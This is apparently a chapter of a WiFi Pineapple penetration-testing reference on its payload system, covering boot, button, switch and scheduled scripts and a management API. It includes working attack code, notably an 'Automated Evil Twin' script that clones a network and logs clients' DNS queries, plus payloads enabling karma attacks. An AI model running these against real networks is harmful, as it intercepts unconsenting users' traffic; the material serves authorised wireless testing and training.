# Payloads Suite Reference

## Overview

The Payloads suite enables automated attack execution on the WiFi Pineapple. Payloads are scripts that run automatically on boot, button press, or scheduled triggers, enabling hands-free operation in the field.

---

## Payloads Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   PAYLOADS ARCHITECTURE                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   ┌─────────────────────────────────────────────────┐       │
│   │               PAYLOAD MANAGER                    │       │
│   │       (Handles execution and scheduling)         │       │
│   └───────────────────┬─────────────────────────────┘       │
│                       │                                      │
│   ┌───────────────────┴─────────────────────────────┐       │
│   │                                                   │       │
│   ▼                   ▼                   ▼          │       │
│ ┌─────────┐     ┌─────────┐       ┌─────────────┐   │       │
│ │  Boot   │     │ Button  │       │  Scheduled  │   │       │
│ │ Payload │     │ Payload │       │   Payloads  │   │       │
│ └─────────┘     └─────────┘       └─────────────┘   │       │
│                                                              │
│   EXECUTION TRIGGERS:                                        │
│   ├── Boot - Runs on device startup                         │
│   ├── Button - Triggered by physical button                 │
│   ├── Cron - Scheduled execution                            │
│   ├── Event - Triggered by system events                    │
│   └── Manual - Web UI or API invocation                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Payload Locations

### Directory Structure

```bash
/sd/payloads/                    # Primary payload storage
├── boot/                        # Boot payloads
│   └── payload.sh
├── button/                      # Button-triggered payloads
│   └── payload.sh
├── switch1/                     # Switch position 1
│   └── payload.sh
├── switch2/                     # Switch position 2
│   └── payload.sh
└── library/                     # Payload library
    ├── recon/
    ├── attacks/
    └── utilities/

/pineapple/modules/              # Module payloads
/root/payloads/                  # Alternative location
```

### Payload Identification

```bash
# List all payloads
find /sd/payloads -name "*.sh" -type f

# Check active boot payload
cat /sd/payloads/boot/payload.sh

# Check button payload
cat /sd/payloads/button/payload.sh
```

---

## Payload Structure

### Standard Template

```bash
#!/bin/bash
#
# Payload ID: PP-XXX
# Name: Payload Name
# Category: Recon/Attack/Utility
# Author: Your Name
# Version: 1.0.0
# Description: What this payload does
#
# Requirements:
#   - WiFi Pineapple Mark VII or Nano
#   - SD card for loot storage
#   - Dependencies: aircrack-ng, tcpdump
#
# Usage:
#   Place in /sd/payloads/boot/ for auto-execution
#   Or run manually: /sd/payloads/library/this_payload.sh
#

# ============================================
# CONFIGURATION
# ============================================

# Payload settings
PAYLOAD_NAME="MyPayload"
VERSION="1.0.0"

# Directories
LOOT_DIR="/sd/loot/${PAYLOAD_NAME}_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="/tmp/${PAYLOAD_NAME}.log"

# Interfaces
WLAN_INTERFACE="wlan1"
MON_INTERFACE="wlan1mon"

# Timing
RUN_DURATION=300  # 5 minutes
SCAN_INTERVAL=30

# ============================================
# LED FUNCTIONS
# ============================================

LED_BASE="/sys/class/leds"

led() {
    local color="$1"
    local state="$2"
    echo "$state" > "${LED_BASE}/pineapple:${color}:system/brightness" 2>/dev/null
}

led_status() {
    local status="$1"
    case "$status" in
        "setup")    led "amber" 1 ;;
        "running")  led "green" 1 ;;
        "success")  led "green" 1; led "blue" 1 ;;
        "error")    led "red" 1 ;;
        "cleanup")  led "amber" 1 ;;
        "off")      led "red" 0; led "green" 0; led "blue" 0; led "amber" 0 ;;
    esac
}

# ============================================
# LOGGING FUNCTIONS
# ============================================

log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

log_error() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] ERROR: $message" | tee -a "$LOG_FILE" >&2
}

# ============================================
# UTILITY FUNCTIONS
# ============================================

check_dependencies() {
    local deps=("$@")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        log_error "Missing dependencies: ${missing[*]}"
        return 1
    fi

    return 0
}

check_interface() {
    local interface="$1"

    if ! ip link show "$interface" >/dev/null 2>&1; then
        log_error "Interface $interface not found"
        return 1
    fi

    return 0
}

setup_monitor_mode() {
    local interface="$1"

    log "Setting up monitor mode on $interface"

    # Kill interfering processes
    airmon-ng check kill >/dev/null 2>&1

    # Enable monitor mode
    airmon-ng start "$interface" >/dev/null 2>&1

    # Verify
    if iw dev | grep -q "${interface}mon"; then
        log "Monitor mode enabled: ${interface}mon"
        return 0
    else
        log_error "Failed to enable monitor mode"
        return 1
    fi
}

disable_monitor_mode() {
    local interface="$1"

    log "Disabling monitor mode"
    airmon-ng stop "${interface}mon" >/dev/null 2>&1
}

# ============================================
# CLEANUP FUNCTION
# ============================================

cleanup() {
    log "Cleaning up..."
    led_status "cleanup"

    # Stop any background processes
    pkill -P $$ 2>/dev/null

    # Restore interface
    disable_monitor_mode "$WLAN_INTERFACE"

    # Restart services
    /etc/init.d/network restart >/dev/null 2>&1

    led_status "off"
    log "Cleanup complete"
    exit 0
}

# Set up signal handlers
trap cleanup SIGINT SIGTERM EXIT

# ============================================
# MAIN PAYLOAD LOGIC
# ============================================

main() {
    log "=========================================="
    log "$PAYLOAD_NAME v$VERSION starting"
    log "=========================================="

    led_status "setup"

    # Create loot directory
    mkdir -p "$LOOT_DIR"

    # Check dependencies
    if ! check_dependencies airmon-ng airodump-ng; then
        led_status "error"
        exit 1
    fi

    # Check interface
    if ! check_interface "$WLAN_INTERFACE"; then
        led_status "error"
        exit 1
    fi

    # Setup
    if ! setup_monitor_mode "$WLAN_INTERFACE"; then
        led_status "error"
        exit 1
    fi

    led_status "running"
    log "Payload running..."

    # ==========================================
    # YOUR PAYLOAD LOGIC HERE
    # ==========================================

    # Example: Run a scan
    timeout $RUN_DURATION airodump-ng \
        -w "$LOOT_DIR/scan" \
        -o csv \
        "$MON_INTERFACE" >/dev/null 2>&1

    # ==========================================
    # END PAYLOAD LOGIC
    # ==========================================

    led_status "success"
    log "Payload complete"
    log "Loot saved to: $LOOT_DIR"

    # Keep success LED on for visibility
    sleep 10
}

# ============================================
# EXECUTE
# ============================================

main "$@"
```

---

## Boot Payloads

### Auto-Start Configuration

```bash
# Enable boot payload
mkdir -p /sd/payloads/boot
cp /sd/payloads/library/my_payload.sh /sd/payloads/boot/payload.sh
chmod +x /sd/payloads/boot/payload.sh

# Disable boot payload
rm /sd/payloads/boot/payload.sh
```

### Boot Payload Example

```bash
#!/bin/bash
# Boot payload: Auto-start reconnaissance

LOG="/sd/loot/boot_$(date +%Y%m%d).log"

# Wait for system to fully boot
sleep 30

echo "[$(date)] Boot payload starting" >> "$LOG"

# Start PineAP with saved config
pineap start >> "$LOG" 2>&1
pineap karma enable >> "$LOG" 2>&1
pineap logging enable >> "$LOG" 2>&1

# Start client monitoring
nohup /sd/payloads/library/monitor_clients.sh &

# LED indicator: Boot complete
echo 1 > /sys/class/leds/pineapple:green:system/brightness

echo "[$(date)] Boot payload complete" >> "$LOG"
```

---

## Button Payloads

### Button Trigger Setup

```bash
# Button payload location
mkdir -p /sd/payloads/button
cat > /sd/payloads/button/payload.sh << 'EOF'
#!/bin/bash
# Button press payload

PRESS_COUNT_FILE="/tmp/button_press_count"
TIMESTAMP=$(date +%s)
LOOT="/sd/loot/button_$(date +%Y%m%d_%H%M%S)"

# Track double-press
if [ -f "$PRESS_COUNT_FILE" ]; then
    LAST_PRESS=$(cat "$PRESS_COUNT_FILE")
    TIME_DIFF=$((TIMESTAMP - LAST_PRESS))

    if [ "$TIME_DIFF" -lt 2 ]; then
        # Double press - emergency stop
        pkill -f airodump-ng
        pkill -f aireplay-ng
        pineap stop
        echo 1 > /sys/class/leds/pineapple:red:system/brightness
        rm "$PRESS_COUNT_FILE"
        exit 0
    fi
fi

echo "$TIMESTAMP" > "$PRESS_COUNT_FILE"

# Single press - capture snapshot
mkdir -p "$LOOT"

# Capture current state
echo "Button pressed at $(date)" > "$LOOT/snapshot.txt"
cat /tmp/dnsmasq.leases >> "$LOOT/snapshot.txt" 2>/dev/null
iw dev wlan0 scan >> "$LOOT/snapshot.txt" 2>/dev/null
cp /tmp/pineap.log "$LOOT/" 2>/dev/null

# LED flash
for i in {1..3}; do
    echo 1 > /sys/class/leds/pineapple:blue:system/brightness
    sleep 0.2
    echo 0 > /sys/class/leds/pineapple:blue:system/brightness
    sleep 0.1
done
EOF

chmod +x /sd/payloads/button/payload.sh
```

---

## Switch Payloads

### Switch Position Handlers

```bash
# Switch position 1: Recon mode
cat > /sd/payloads/switch1/payload.sh << 'EOF'
#!/bin/bash
# Switch 1: Passive reconnaissance

pineap stop 2>/dev/null
airmon-ng check kill

# Start passive scan
airmon-ng start wlan1
timeout 300 airodump-ng -w /sd/loot/recon_$(date +%s) wlan1mon &

# LED: Blue for recon
echo 1 > /sys/class/leds/pineapple:blue:system/brightness
EOF

# Switch position 2: Attack mode
cat > /sd/payloads/switch2/payload.sh << 'EOF'
#!/bin/bash
# Switch 2: Active attack

# Stop recon
pkill airodump-ng
airmon-ng stop wlan1mon 2>/dev/null

# Start PineAP attack
pineap start
pineap karma enable
pineap beacon_response enable

# LED: Red for attack
echo 1 > /sys/class/leds/pineapple:red:system/brightness
EOF
```

---

## Scheduled Payloads (Cron)

### Cron Configuration

```bash
# Edit crontab
crontab -e

# Example scheduled payloads:

# Run recon every hour
0 * * * * /sd/payloads/library/quick_recon.sh

# Daily handshake check at midnight
0 0 * * * /sd/payloads/library/handshake_summary.sh

# Every 15 minutes: client count
*/15 * * * * /sd/payloads/library/client_count.sh >> /sd/loot/clients.log

# Hourly system health check
0 * * * * /sd/payloads/library/health_check.sh
```

### Scheduled Payload Example

```bash
#!/bin/bash
# Scheduled: Hourly environment snapshot

LOOT_DIR="/sd/loot/scheduled/$(date +%Y%m%d)"
SNAPSHOT="$LOOT_DIR/snapshot_$(date +%H%M).txt"

mkdir -p "$LOOT_DIR"

{
    echo "=========================================="
    echo "Environment Snapshot: $(date)"
    echo "=========================================="

    echo -e "\n=== Connected Clients ==="
    cat /tmp/dnsmasq.leases 2>/dev/null || echo "No DHCP leases"

    echo -e "\n=== PineAP Status ==="
    pineap status 2>/dev/null || echo "PineAP not running"

    echo -e "\n=== Nearby Networks ==="
    iw dev wlan0 scan 2>/dev/null | grep -E "SSID:|signal:|BSS " | head -30

    echo -e "\n=== System Resources ==="
    free -h
    df -h /sd

} > "$SNAPSHOT"
```

---

## Payload Library

### Organizing Payloads

```bash
/sd/payloads/library/
├── recon/
│   ├── passive_scan.sh
│   ├── client_discovery.sh
│   ├── probe_harvest.sh
│   └── network_map.sh
├── attacks/
│   ├── evil_twin.sh
│   ├── karma_attack.sh
│   ├── handshake_capture.sh
│   ├── deauth_attack.sh
│   └── captive_portal.sh
├── exfil/
│   ├── loot_compress.sh
│   ├── upload_ftp.sh
│   └── upload_http.sh
└── utilities/
    ├── led_patterns.sh
    ├── interface_setup.sh
    ├── cleanup.sh
    └── health_check.sh
```

### Include Library Functions

```bash
#!/bin/bash
# payload.sh - Include common functions

# Source utility libraries
LIBRARY="/sd/payloads/library"
source "$LIBRARY/utilities/led_patterns.sh"
source "$LIBRARY/utilities/interface_setup.sh"

# Now use library functions
led_status "running"
setup_monitor_mode "wlan1"
```

---

## Payload Helpers

### Common Functions Library

```bash
#!/bin/bash
# /sd/payloads/library/utilities/common.sh
# Common functions for all payloads

# ============================================
# ENVIRONMENT DETECTION
# ============================================

get_pineapple_model() {
    if [ -f /etc/pineapple/model ]; then
        cat /etc/pineapple/model
    elif grep -q "MT7628" /proc/cpuinfo; then
        echo "nano"
    else
        echo "tetra"
    fi
}

get_available_space() {
    local path="${1:-/sd}"
    df "$path" 2>/dev/null | tail -1 | awk '{print $4}'
}

has_internet() {
    ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1
}

# ============================================
# INTERFACE HELPERS
# ============================================

get_interfaces() {
    iw dev 2>/dev/null | grep Interface | awk '{print $2}'
}

get_mac() {
    local iface="$1"
    cat /sys/class/net/${iface}/address 2>/dev/null
}

is_monitor_mode() {
    local iface="$1"
    iw dev "$iface" info 2>/dev/null | grep -q "type monitor"
}

# ============================================
# CLIENT HELPERS
# ============================================

get_connected_clients() {
    if [ -f /tmp/dnsmasq.leases ]; then
        cat /tmp/dnsmasq.leases | awk '{print $2,$3,$4}'
    fi
}

count_clients() {
    get_connected_clients | wc -l
}

# ============================================
# LOOT HELPERS
# ============================================

create_loot_dir() {
    local name="$1"
    local dir="/sd/loot/${name}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$dir"
    echo "$dir"
}

compress_loot() {
    local dir="$1"
    local archive="${dir}.tar.gz"
    tar -czf "$archive" -C "$(dirname $dir)" "$(basename $dir)"
    echo "$archive"
}

# ============================================
# TIMING HELPERS
# ============================================

wait_for_clients() {
    local timeout="${1:-60}"
    local start=$(date +%s)

    while true; do
        if [ $(count_clients) -gt 0 ]; then
            return 0
        fi

        local elapsed=$(($(date +%s) - start))
        if [ $elapsed -ge $timeout ]; then
            return 1
        fi

        sleep 5
    done
}

run_for_duration() {
    local cmd="$1"
    local duration="$2"

    timeout "$duration" bash -c "$cmd"
}
```

---

## API Control

### Payload Management API

```bash
# Base URL
API="http://172.16.42.1:1471/api"

# List available payloads
curl -s "$API/payloads/list"

# Get payload info
curl -s "$API/payloads/info?name=evil_twin"

# Execute payload
curl -s -X POST "$API/payloads/execute" -d "name=evil_twin"

# Stop running payload
curl -s -X POST "$API/payloads/stop"

# Upload new payload
curl -s -X POST "$API/payloads/upload" \
    -F "file=@my_payload.sh" \
    -F "category=attacks"

# Set boot payload
curl -s -X POST "$API/payloads/boot/set" -d "name=auto_recon"

# Clear boot payload
curl -s -X POST "$API/payloads/boot/clear"
```

---

## Example Payloads

### Quick Recon Payload

```bash
#!/bin/bash
# PP-001: Quick Reconnaissance
# Fast environment scan and client discovery

LOOT=$(create_loot_dir "quick_recon")
led_status "running"

# Scan for networks
log "Scanning for networks..."
timeout 30 iw dev wlan0 scan > "$LOOT/networks.txt" 2>&1

# Parse results
grep -E "SSID:|signal:|BSS " "$LOOT/networks.txt" | \
    paste - - - | \
    sort -t':' -k4 -n > "$LOOT/networks_sorted.txt"

# Count results
NETWORK_COUNT=$(grep -c "SSID:" "$LOOT/networks.txt")
CLIENT_COUNT=$(count_clients)

# Generate summary
cat > "$LOOT/summary.txt" << EOF
Quick Recon Summary
==================
Timestamp: $(date)
Networks found: $NETWORK_COUNT
Connected clients: $CLIENT_COUNT

Top 10 Networks (by signal):
$(head -10 "$LOOT/networks_sorted.txt")
EOF

led_status "success"
log "Recon complete: $NETWORK_COUNT networks, $CLIENT_COUNT clients"
```

### Automated Evil Twin

```bash
#!/bin/bash
# PP-010: Automated Evil Twin
# Clone target network and capture clients

TARGET_SSID="${1:-FreeWiFi}"
LOOT=$(create_loot_dir "evil_twin")

led_status "setup"

# Setup Evil Twin
cat > /tmp/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=6
EOF

cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.4.100,192.168.4.200,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
log-queries
log-dhcp
log-facility=$LOOT/dns.log
EOF

# Configure interface
ip addr flush dev wlan0
ip addr add 192.168.4.1/24 dev wlan0
ip link set wlan0 up

# Enable NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Start services
dnsmasq -C /tmp/dnsmasq.conf &
hostapd /tmp/hostapd.conf &

led_status "running"
log "Evil Twin active: $TARGET_SSID"

# Monitor for clients
while true; do
    CLIENT_COUNT=$(count_clients)
    log "Connected clients: $CLIENT_COUNT"

    if [ $CLIENT_COUNT -gt 0 ]; then
        led_blink "green" 1
    fi

    sleep 10
done
```

---

## Best Practices

### Error Handling

```bash
# Always check command success
if ! command; then
    log_error "Command failed"
    led_status "error"
    exit 1
fi

# Use set options
set -euo pipefail

# Trap errors
trap 'log_error "Error on line $LINENO"; cleanup; exit 1' ERR
```

### Resource Management

```bash
# Check available space before writing
SPACE=$(get_available_space /sd)
if [ "$SPACE" -lt 102400 ]; then  # 100MB
    log_error "Insufficient storage"
    exit 1
fi

# Clean up old loot
find /sd/loot -type f -mtime +7 -delete
```

### Security Considerations

```bash
# Validate inputs
sanitize_ssid() {
    local ssid="$1"
    # Remove potentially dangerous characters
    echo "$ssid" | tr -cd '[:alnum:] _-'
}

# Use temp files securely
TEMP=$(mktemp)
trap "rm -f $TEMP" EXIT
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────┐
│                PAYLOADS SUITE QUICK REFERENCE               │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  PAYLOAD LOCATIONS:                                          │
│    /sd/payloads/boot/payload.sh      - Boot execution       │
│    /sd/payloads/button/payload.sh    - Button trigger       │
│    /sd/payloads/switch1/payload.sh   - Switch position 1    │
│    /sd/payloads/switch2/payload.sh   - Switch position 2    │
│    /sd/payloads/library/             - Payload library      │
│                                                              │
│  EXECUTION:                                                  │
│    Boot      - Automatic on startup                         │
│    Button    - Physical button press                        │
│    Switch    - Switch position change                       │
│    Cron      - Scheduled via crontab                        │
│    Manual    - Web UI or API                                │
│                                                              │
│  REQUIRED ELEMENTS:                                          │
│    #!/bin/bash                    - Shebang                 │
│    cleanup() trap                 - Signal handling         │
│    LED indicators                 - Status feedback         │
│    Logging                        - Audit trail             │
│                                                              │
│  LED PATTERNS:                                               │
│    Amber    - Setup/Cleanup                                 │
│    Blue     - Running                                       │
│    Green    - Success                                        │
│    Red      - Error                                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

[← Alert Suite](09_Alert_Suite.md) | [Back to Fundamentals](README.md) | [Next: Recon Suite →](11_Recon_Suite.md)
